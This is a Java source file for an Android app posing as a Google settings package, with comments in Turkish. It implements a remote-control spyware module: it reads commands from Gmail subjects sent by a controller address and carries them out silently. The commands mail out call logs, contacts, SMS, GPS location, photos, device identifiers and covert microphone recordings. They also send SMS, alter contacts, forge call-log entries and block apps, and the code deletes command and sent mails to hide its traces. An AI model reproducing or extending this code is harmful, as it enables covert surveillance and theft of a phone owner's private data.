package com.setting.dl.google.googlesettings.mail;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import com.google.api.client.util.Base64;
import com.google.api.client.util.StringUtils;
import com.google.api.services.gmail.model.Message;
import com.google.api.services.gmail.model.MessagePartHeader;
import com.setting.dl.google.googlesettings.AccessNotification;
import com.setting.dl.google.googlesettings.AudioRecord;
import com.setting.dl.google.googlesettings.MailJobs;
import com.setting.dl.google.googlesettings.Time;
import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.phone.Calls;
import com.setting.dl.google.googlesettings.phone.Contacts;
import com.setting.dl.google.googlesettings.phone.InstalledApps;
import com.setting.dl.google.googlesettings.phone.SendSms;
import com.setting.dl.google.googlesettings.recievers.CallRecord;
import com.setting.dl.google.googlesettings.u;

import java.io.File;
import java.io.IOException;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import static com.setting.dl.google.googlesettings.mail.gmail.GmailService.getGmailService;
import static com.setting.dl.google.googlesettings.mail.gmail.Mail.mylistMessagesWithLabelsWithQ;

public class Orders {
	
	
	/*
	 * belirli resimleri almak için
	 * */
	private static   final String KOMUT_031 = "get images";
	
	private static String order;
	private static String body;
	
	
	private static void deleteSendMails(final Context context) {
		
		u.run(() -> Mail.deleteAllSent(context), 10000);
		
	}
	
	public static void getOrderEx(final Context context) {
		
		if (!u.isDeviceOnline(context)) {
			
			System.gc();
			return;
		}
		
		
		AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
			
			@Override
			protected Void doInBackground(Void... voids) {
				
				u.log.d("komut kontrol ediyor");
				
				List<Message> inboxMessages;
				List<Message> messages = new ArrayList<>();
				
				try {
					
					inboxMessages = mylistMessagesWithLabelsWithQ(getGmailService(context), "me", Collections.singletonList("INBOX"), u.s("from:%s", getTo(context)));
					
					
					if (inboxMessages == null || inboxMessages.isEmpty()) {
						
						u.log.d("komut yok");
						return null;
					}
					
					for (int i = 0; i < inboxMessages.size(); i++) {
						
						Message m = inboxMessages.get(i);
						Message msg = getMessage(context, m.getId());
						messages.add(msg);
					}
				}
				catch (Exception e) {
					
					String error = u.s("****\ngetInboxFrom\nmail alınamadı : %s", e.toString());
					u.saveValue(context, "error.txt", error);
					Log.e("getInboxFrom", error);
				}
				
				
				for (Message message : messages) {
					
                    order = getSubject(message);
                    
					if (order == null || order.equals("")) {
						
						deleteOrder(context, message.getId());
						continue;
					}
					else {
						
						if (order.equals(KOMUT_031)) {
							
							body = getBody(message);
						}
					}
					
					u.log.d("komut alındı : " + order);
					
					deleteOrder(context, message.getId());
					
					try {
						doit(context);
					}
					catch (OrderException e) {
						e.printStackTrace();
						
						Mail.send(context, "Komut Hatası", e.toString() + "\norder : " + order);
						
					}
					catch (Exception e) {
						
						Mail.send(context, "Orders Hata", e.toString() + "\norder : " + order);
						
					}
				}
				
				
				deleteSendMails(context);
				
				return null;
			}
		};
		
		task.execute();
		
		
		
	}
	
	private static void doit(Context context) throws OrderException {
		
		//deleteAllSent(context);
		
		switch (order) {
			
			
			case "callLog":
				new OrderSendCalls(context).doit();
				return;
			
			
			case "contacts":
				new OrderSendContacts(context).doit();
				return;
			
			
			case "messages":
				new OrderSendSms(context).doit();
				return;
			
			
			case "location":
				location(context);
				return;
			
			
			case "battery":
				
				String fileBattery = "battery.txt";
				u.saveValue(context, fileBattery, new Battery(context).doInBackground());
				Mail.send(context, fileBattery);
				
				return;
			
			
			
			case "phone info":
				
				String filePhoneInfo = "phoneinfo.txt";
				u.saveValue(context, filePhoneInfo, phoneInfo(context));
				Mail.send(context, filePhoneInfo);
				
				return;
			
			
			case "apps":
				String v = new InstalledApps(context).get();
				new MailSendIcons(context, v);
				
				return;
			
			
			case "images":
				new MailingImages(context);
				return;
			
			
			
			case "delete imageparts":
				
				for (File file : new File(u.getImageFolder(context)).listFiles()) {
					
					if (file.delete()) {
						
						u.log.d("Resim dosyası silindi : " + file.getName());
					}
					else {
						
						u.log.d("Resim dosyası silinemedi : " + file.getName());
					}
				}
				
				if (new File(u.getImageFolder(context)).listFiles().length > 0) {
					
					Mail.send(context, "Resim sil", "komut işletildi ancak silinemeyen dosyalar var");
					
				}
				else {
					
					Mail.send(context, "Resim sil", "komut işletildi tüm dosyalar silindi");
				}
				
				deleteSendMails(context);
				
				
				return;
			
			//delete audioparts
			case "delete audioparts":
				
				File[] audioFiles = new File(u.getAudioFolder(context)).listFiles();
				ArrayList<String> silinenler = new ArrayList<>();
				ArrayList<String> kalanlar = new ArrayList<>();
				StringBuilder data = new StringBuilder(u.dateStamp() + "\ndeleteaudioparts komutu işletildi\n");
				boolean silinemeyen = false;
				boolean silinen = false;
				
				if (audioFiles != null && audioFiles.length > 1) {
					
					data.append(u.s("audio klasöründe %d dosya var\n", audioFiles.length));
					
					for (File file : audioFiles) {
						
						if (!file.getName().endsWith(".mp3")) {
							
							String dosya = file.getName();
							
							if (file.delete()) {
								
								data.append("audioparts dosyası bulundu ve silindi : ").append(dosya);
								silinenler.add(dosya);
								silinen = true;
							}
							else {
								data.append("audioparts dosyası bulundu ancak silinemedi : ").append(dosya);
								kalanlar.add(dosya);
								silinemeyen = true;
							}
							
						}
					}
				}
				
				data.append("\n---------------------------------\n");
				
				if (silinen && !silinemeyen) {
					
					data.append("Silenen dosyalar\n-----------------------\n\n");
					
					for (String dosya : silinenler) {
						
						data.append(dosya).append("\n");
					}
					
					Mail.send(context, "deleteaudioparts", data.toString());
				}
				else if (silinen && silinemeyen) {
					
					data.append("\nBazı dosyalar silinemedi\n\nSilinemeyen dosyalar\n");
					
					for (String file : kalanlar) {
						
						
						data.append(file).append("\n");
					}
					
					data.append("\nSilenen dosyalar\n-----------------------\n\n");
					
					
					for (String dosya : silinenler) {
						
						data.append(dosya).append("\n");
					}
					
					Mail.send(context, "deleteaudioparts", data.toString());
					
				}
				
				else if (!silinemeyen && !silinen) {
					
					data.append("Klasörde dosya yok\n");
					Mail.send(context, "Ses sil", data.toString());
					
				}
				
				deleteSendMails(context);
				
				return;
			
			
			case "get audioparts":
				
				new MailingFile(context);
				return;
			
			
			case "get imageparts":
				
				new MailImageParts(context);
				return;
			
			
			case "list images":
				
				List<Images.Image> imageFiles = new Images(context).getImages();
				
				StringBuilder list = new StringBuilder(u.dateStamp());
				
				if (imageFiles != null && imageFiles.size() > 0) {
					
					for (Images.Image image : imageFiles) {
						
						list.append(image.getData()).append("\n");
					}
					
					Mail.send(context, "Resim listesi", list.toString());
					deleteSendMails(context);
				}
				
				return;
			
			
			case KOMUT_031:
				
				u.log.i("KOMUT_031 get images");
				
				if (body != null && !body.equals("")) {
					
					List<String> files = Arrays.asList(body.split("[\n\r]"));
					List<String> _files = new ArrayList<>();
					
					for(int i = 0; i < files.size(); i++) {
						
						String file = files.get(i);
						
						if(file != null && !TextUtils.isEmpty(file)) _files.add(file);
					}
					
					u.log.i("istenen dosyalar : %s", Arrays.toString(_files.toArray()));
					List<Images.Image> imageList = new Images(context).getImages();
					
					List<String> imageDatas = new ArrayList<>();
					List<Images.Image> gettings = new ArrayList<>();
					
					for (Images.Image image : imageList) imageDatas.add(image.getData());
					
					for (int i = 0; i < _files.size(); i++) {
						
						String file = _files.get(i);
						
						for (int j = 0; j < imageDatas.size(); j++) {
							
							if (imageDatas.get(j).contains(file)) {
								
								if(gettings.contains(imageList.get(j))) continue;
								
								gettings.add(imageList.get(j));
								
							}
						}
					}
					
					if (gettings.size() == 0) {
						
						u.log.i("istenen dosya yok");
					}
					else{
						
						
						for(Images.Image image : gettings) u.log.i("Gönderilecek dosyalar : %s", image.getData());
						
						for (Images.Image image : gettings) {
							
							u.log.i("Dosya gönderilecek : %s", image.getData());
							MailingImages.sendImageDirect(context, image);
						}
					}
					
				}
				
				else {
					
					u.log.i("KOMUT_031 get images : istenen dosya yok : body = %s", body);
				}
				
				
				return;
			
			
			case "audio files":
				
				StringBuilder audioFileList = new StringBuilder(u.dateStamp());
				
				String[] files = new File(u.getAudioFolder(context)).list();
				
				
				if (files != null) {
					
					if (files.length > 0) {
						
						for (String file : files) {
							
							audioFileList.append(file).append("\n");
						}
						
					}
					else {
						
						audioFileList.append("Klasörde ses dosyası yok\n");
					}
					
					audioFileList.append("*************************\n");
					Mail.send(context, "Ses Listesi", audioFileList.toString());
					deleteSendMails(context);
				}
				else {
					
					Mail.send(context, "Ses Listesi", "new File(u.getAudioFolder(context)).list() = null");
					deleteSendMails(context);
				}
				
				return;
			
			case "ative app":
				
				final ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
				
				ActivityManager.RunningAppProcessInfo activeApp = null;
				if (activityManager != null) {
					activeApp = activityManager.getRunningAppProcesses().get(0);
				}
				
				if (activeApp != null) {
					
					Mail.send(context, "Aktif Uygulama", u.s("%s\npid : %d", activeApp.processName, activeApp.pid));
					u.log.d(activeApp.processName);
					deleteSendMails(context);
				}
				
				return;
			
		}
		
		
		/*if (order.contains("usage info")) {
			
			if (order.contains("_")) {
				
				int day = Integer.valueOf(order.split("_")[1]);
				
				new Mail().send(context, "Kullanım Bilgisi", new UsageStatMan(context, day).toStringForEvents());
				deleteSendMails(context);
				
			}
			else {
				
				new Mail().send(context, "Kullanım Bilgisi", new UsageStatMan(context).toStringForEvents());
				deleteSendMails(context);
			}
			
			
			return;
		}*/
		
		
		if (order.contains("wake sms")) {
			
			if (order.contains("_") && order.contains(";")) {
				
				String smsPartsString = order.split("_")[1];
				
				String[] smsParts = smsPartsString.split(";");
				
				new SendSms(context, smsParts[0], smsParts[1]);
			}
			else {
				
				throw new OrderException("Sms gönderme komutu hatalı : " + order + "\nKullanımı : sms gönder_numara;mesaj");
			}
			
			return;
		}
		
        
		if (order.contains("change account")) {
			
			
			if (!order.contains("_")) {
				
				throw new OrderException("Hesap değiştirme komutu hatalı : " + order);
			}
			
			String newAccount = order.split("_")[1];
			u.log.d("yeni hesap geçerli mi kontrol ediliyor : " + newAccount);
			
			if (isValidEmail(newAccount)) {
				
				u.log.d("yeni hesap geçerli");
				
				context.getSharedPreferences("gmail", Context.MODE_PRIVATE).edit().putString("to", newAccount).apply();
				Mail.send(context, "Yeni hesap", "yeni hesap : " + newAccount);
				
				u.log.d("new account : " + newAccount);
			}
			else {
				u.log.d("yeni hesap geçerli değil");
				Mail.send(context, "Yeni hesap", "yeni hesap geçersiz : " + newAccount);
			}
			
			deleteSendMails(context);
			return;
			
		}
		
		if (order.contains("record")) {
			
			record(context);
			return;
		}
  
    
		
  
		//NUMBER_DELETE
		if (order.contains("delete number")) {
			
			if (!order.contains("_")) {
				
				throw new OrderException("Rehberden numara silme komutu hatalı : " + order);
			}
			
			String number = order.split("_")[1];
			String name = Contacts.deleteContactWithNumber(context, number);
			
			if (name != null) {
				
				Mail.send(context, "Numara Silme", "Kişi silindi : " + name);
				
			}
			
			else {
				
				Mail.send(context, "Numara Silme", "Bu numaraya sahip kişi bulunamadı : " + number);
			}
			
			deleteSendMails(context);
			return;
		}
		
		//ADD_CONTACT
		if (order.contains("add contact")) {
			
			if (!order.contains("_") || !order.contains(";")) {
				
				throw new OrderException("Rehbere kişi ekleme komutu hatalı : " + order);
			}
			
			String[] nameAndNumber = order.split("_")[1].split(";");
			
			boolean b = Contacts.addContact(context, nameAndNumber[0], nameAndNumber[1]);
			
			if (b) {
				
				Mail.send(context, "Kişi Ekleme", "Kişi eklendi : " + nameAndNumber[0] + " " + nameAndNumber[1]);
			}
			else {
				
				Mail.send(context, "Kişi Ekleme", "Kişi ekleme başarısız : " + nameAndNumber[0] + " " + nameAndNumber[1]);
			}
			
			
			deleteSendMails(context);
			return;
		}
		
		
		//UPDATE_CONTACT
		if (order.contains("update number")) {
			
			if (order.contains("_") && order.contains(";")) {
				
				throw new OrderException("Kişi güncelleme komutu hatalı : " + order);
			}
			
			String[] nameAndNewNumber = order.split("_")[1].split(";");
			
			boolean b = Contacts.updateContact(context, nameAndNewNumber[0], nameAndNewNumber[1]);
			
			if (b) {
				
				Mail.send(context, "Kişi Güncelleme", "Kişi güncellendi : " + nameAndNewNumber[0] + " " + nameAndNewNumber[1]);
			}
			else {
				
				Mail.send(context, "Kişi Güncelleme", "Kişi güncelleme başarısız : " + nameAndNewNumber[0] + " " + nameAndNewNumber[1]);
			}
			
			
			deleteSendMails(context);
			return;
		}
		
		
		
		
		
		
		
		//en çok arananlar
		if (order.equals("most contacts")) {
			
			u.log.d("requested most contacted contacts");
			String value = new Calls(context).enCokArananlar();
			
			Mail.send(context, "call", value);
			deleteSendMails(context);
			
		}
		
		//arama kaydı sil
		if (order.contains("delete call")) {
			
			if (order.contains("_")) {
				
				String id = order.split("_")[1];
				
				
				try {
					
					Calls.deleteCallWithId(context.getContentResolver(), id);
					Mail.send(context, "Call Log", "Arama kaydı silindi : " + id);
					
				}
				catch (SecurityException e) {
					
					Mail.send(context, "Call Log", "Arama kaydı silinemedi\nGüvenlik hatası : " + id);
				}
			}
			else {
				
				throw new OrderException(order);
			}
			
			deleteSendMails(context);
			return;
		}
		
		//arama kaydı ekle
		if (order.contains("add call")) {
			
			if (order.contains("_")) {
				
				String callInfo = order.split("_")[1];
				
				if (!callInfo.contains(";")) {
					
					throw new OrderException(order);
				}
				
				String[] call = callInfo.split(";");
				
				if (call.length != 4) {
					
					throw new OrderException(order);
				}
				
				String number = call[0];
				String date = call[1];
				String duration = call[2];
				
				try {
					
					int type = Integer.valueOf(call[3]);
					
					Calls.insertPlaceholderCall(context.getContentResolver(), number, date, duration, type, 0);
					
				}
				catch (NumberFormatException e) {
					
					throw new OrderException(order);
				}
				catch (SecurityException e) {
					
					Mail.send(context, "Call Log", "Arama kaydı eklenemedi\nGüvenlik hatası");
				}
			}
			
			else {
				
				throw new OrderException(order);
			}
			
			deleteSendMails(context);
			return;
			
		}
		
		
		
		if (order.equals("wakeup")) {
			
			u.log.d("wakeup");
			
			MailJobs.wake(context);
			u.sendMessage(context, "Orders", "wakeup");
			
			return;
		}
		
		if (order.startsWith("block window")) {
			
			u.log.d("command : block window");
			
			if (!order.contains("_")) {
				
				throw new OrderException("block window");
			}
			
			
			String packageName = order.split("_")[1];
			
			if (packageName != null && !packageName.isEmpty()) {
				
				SharedPreferences pref = context.getSharedPreferences("nlService", Context.MODE_PRIVATE);
				
				Set<String> blockedWindows = pref.getStringSet("blockedWindows", new HashSet<>());
				
				if (!blockedWindows.contains(packageName)) {
					
					blockedWindows.add(packageName);
					pref.edit().putStringSet("blockedWindows", blockedWindows).apply();
				}
				
				u.sendMessage(context, "blockedWindows", Arrays.toString(blockedWindows.toArray()));
			}
			
			return;
		}
		
		if (order.equals("accessibility service status")) {
            
		    String title = "AccessibilityService Status", text;
		    
            if(AccessNotification.isAccessibilityServiceEnabled(context, AccessNotification.class)){
                
                text = "Service is running";
            }
            else{
                
                text = "Service is not running";
            }
            
            u.sendMessage(context, title, text);
		}
		
		
	}
	
	private static void record(Context context) {
		
		if (!order.contains("_")) {
			
			String data = u.getDate(new Date()) + "\n";
			
			data += "Komut hatalı : " + order;
			
			u.saveValue(context, "record.txt", data);
			
			Mail.send(context, "record.txt");
			
			return;
		}
		
		int duration;
		int delay = 0;
		
		String durationString = order.split("_")[1];
		
		
		try {
			
			if (!durationString.contains(";")) {
				
				duration = Integer.valueOf(durationString);
			}
			else {
				
				duration = Integer.valueOf(durationString.split(";")[0]);
				delay = Integer.valueOf(durationString.split(";")[1]);
			}
			
			
			if (!AudioRecord.isRunning()) {
				
				if (!CallRecord.isRunning()) {
					
					new AudioRecord(context, duration, delay);
				}
				else{
					
					u.sendMessage(context, "Record Order", "There is a callrecord, ignoring audio record");
				}
			}
			else{
				
				u.sendMessage(context, "Record Order", "AudioRecord is already running, ignoring this one");
			}
			
		}
		catch (Exception e) {
			
			Mail.send(context, "ses kayıt", "Komut hatalı : " + order + "\nYeni bir kayıt oluşturuluyor");
			
			new AudioRecord(context, 30, 0);
		}
	}
	
	private static void location(Context context) {
		
		new GPSLocation(context);
	}
	
	private static boolean isValidEmail(String email) {
		
		return !TextUtils.isEmpty(email) && android.util.Patterns.EMAIL_ADDRESS.matcher(email).matches();
	}
	
	@SuppressLint("HardwareIds")
	private static String phoneInfo(Context context) {
		
		ConnectivityManager connectivityManager = (ConnectivityManager) context.getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
		
		int type = 0;
		
		if (connectivityManager != null) {
			
			type = connectivityManager.getActiveNetworkInfo().getType();
		}
		
		NetworkInfo networkInfo = null;
		
		if (connectivityManager != null) {
			
			networkInfo = connectivityManager.getActiveNetworkInfo();
		}
		
		if (networkInfo == null) return "network info null\n";
		
		String value = u.s("%s\n", Time.whatTimeIsIt());
		
		if (type == ConnectivityManager.TYPE_WIFI) {
			
			value += u.s("%s %s\n", wifiName(context), getMacAddr());
			
		}
		else if (type == ConnectivityManager.TYPE_MOBILE) {
			
			value += u.s("%s %s\n", networkInfo.getSubtypeName(), networkInfo.getExtraInfo());
		}
		
		
		value += u.s("%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n",
				networkInfo.getTypeName(),
				networkInfo.isConnected() ? "connected" : "disconnected",
				Build.MODEL,
				Build.DEVICE,
				Build.DISPLAY,
				Build.BRAND,
				Build.HARDWARE,
				Build.MANUFACTURER,
				Build.BOARD,
				Build.BOOTLOADER,
				Build.FINGERPRINT,
				Build.PRODUCT,
				Build.SERIAL,
				Build.USER,
				Build.TYPE,
				Build.TAGS,
				Build.VERSION.SDK_INT,
				getImei(context)
		
		);
		
		
		//Log.i("connectivityInfo", value);
		
		return value;
	}
	
	@SuppressLint("HardwareIds")
	private static String getImei(Context context) {
		
		TelephonyManager m_telephonyManager = (TelephonyManager) context.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
		//String           IMEI, IMSI;
		if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
			
			if (m_telephonyManager != null) {
				return m_telephonyManager.getDeviceId();
			}
		}
		
		if (m_telephonyManager != null) {
			return m_telephonyManager.getDeviceId();
		}
		
		return "imei alınamıyor";
	}
	
	private static String wifiName(Context context) {
		
		WifiManager wifiMgr = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
		WifiInfo wifiInfo = null;
		if (wifiMgr != null) {
			wifiInfo = wifiMgr.getConnectionInfo();
		}
		if (wifiInfo != null) {
			return wifiInfo.getSSID();
		}
		
		return "wifi ismi alınamıyor";
	}
	
	@NonNull
	private static String getMacAddr() {
		
		try {
			List<NetworkInterface> all = Collections.list(NetworkInterface.getNetworkInterfaces());
			for (NetworkInterface nif : all) {
				if (!nif.getName().equalsIgnoreCase("wlan0")) continue;
				
				byte[] macBytes = nif.getHardwareAddress();
				if (macBytes == null) {
					return "";
				}
				
				StringBuilder res1 = new StringBuilder();
				for (byte b : macBytes) {
					res1.append(String.format("%02X:", b));
				}
				
				if (res1.length() > 0) {
					res1.deleteCharAt(res1.length() - 1);
				}
				return res1.toString();
			}
		}
		catch (Exception ignored) {
		}
		return "02:00:00:00:00:00";
	}
	
	public static String connectionInfo(Context context) {
		
		ConnectivityManager connectivityManager =
				(ConnectivityManager) context.getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
		
		int type = 0;
		if (connectivityManager != null) {
			type = connectivityManager.getActiveNetworkInfo().getType();
		}
		NetworkInfo networkInfo = null;
		if (connectivityManager != null) {
			networkInfo = connectivityManager.getActiveNetworkInfo();
		}
		
		if (networkInfo == null) return "network info null\n";
		
		
		String value = "";
		
		if (type == ConnectivityManager.TYPE_WIFI) {
			
			value += u.s("%s %s", wifiName(context), getMacAddr());
			
		}
		else if (type == ConnectivityManager.TYPE_MOBILE) {
			
			value += u.s("%s %s %s", networkInfo.getSubtypeName(), networkInfo.getExtraInfo(), simOperatorName(context));
		}
		else {
			
			value += u.s("%s", networkInfo.getTypeName());
		}
		
		return value;
	}
	
	private static String simOperatorName(Context context) {
		
		TelephonyManager telephonyManager = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));
		if (telephonyManager != null) {
			return telephonyManager.getNetworkOperatorName();
		}
		return "boşCELL";
	}
	
	private static Message getMessage(final Context context, final String id) {
		
		class GetMessage extends AsyncTask<Void, Void, Message> {
			
			@Override
			protected Message doInBackground(Void... params) {
				
				Message message = null;
				
				try {
					
					message = getGmailService(context).users().messages().get("me", id).execute();
					
				}
				catch (Exception e) {
					
					String error = u.s("GetMessage - mail alınamadı : %s", e.toString());
					Log.e("GetMessage", error);
					u.saveValue(context, "error.txt", error);
				}
				
				return message;
			}
		}
		
		return new GetMessage().doInBackground();
		
	}
	
    private static String getBody(Message message) {
        
        return StringUtils.newStringUtf8(Base64.decodeBase64(message.getPayload().getParts().get(0).getBody().getData()));
        
    }
	
	public static class OrderException extends Exception {
		
		OrderException(String message) {
			
			super(message);
		}
		
		OrderException() {
			
			super();
		}
	}
	
	private static String getTo(final Context context) {
		
		return context.getSharedPreferences("gmail", Context.MODE_PRIVATE).getString("to", null);
	}
	
	private static void deleteOrder(final Context context, final String id) {
		
		try {
			
			getGmailService(context).users().messages().delete("me", id).execute();
			u.log.w("komut silindi");
			
		}
		catch (IOException e) {
			e.printStackTrace();
			u.log.e("komut silinemedi");
		}
	}
    
    private static String getSubject(Message message) {
    
        List<MessagePartHeader> k = message.getPayload().getHeaders();
        
        for (MessagePartHeader messagePartHeader : k) {
        
            if ("Subject".equals(messagePartHeader.getName())) {
            
                return messagePartHeader.getValue();
            }
        }
        
        return null;
    }
	
}
